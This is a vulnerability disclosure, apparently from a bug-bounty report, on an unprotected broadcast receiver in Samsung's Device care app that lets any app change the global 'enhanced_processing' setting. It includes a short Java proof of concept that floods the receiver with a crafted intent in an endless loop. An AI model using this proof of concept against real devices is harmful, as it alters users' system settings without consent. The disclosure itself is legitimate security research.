# Details

<table>
    <tr>
        <td>Name</td>
        <td>Device care</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.lool</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.20</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/094.%20Device%20care%20—%20Changing%20CPU%20and%20enhanced%20processing%20values/Oversecured_report.png)

Oversecured found an unprotected dynamically registered receiver in the Device care app in the file `com/samsung/android/sm/enhancedcpu/ProcessingSpeedDcTileBridge.java`. It handles the `com.samsung.android.sm.ACTION_ENHANCED_PROCESSING_TILE` action and sets the global settings value `enhanced_processing` from the attacker-controlled `mode` value. When `mode` is 0 or 1, the value will be set to 0. When 2, it will be set to 1.

**Proof of Concept**

Setting `enhanced_processing` to 2 and `sem_enhanced_cpu_responsiveness` to 1.

```java
new Thread(() -> {
    Intent i = new Intent("com.samsung.android.sm.ACTION_ENHANCED_PROCESSING_TILE");
    i.setPackage("com.samsung.android.lool");
    i.putExtra("mode", 2);
    while (true) {
        sendBroadcast(i);
    }
}).start();
```
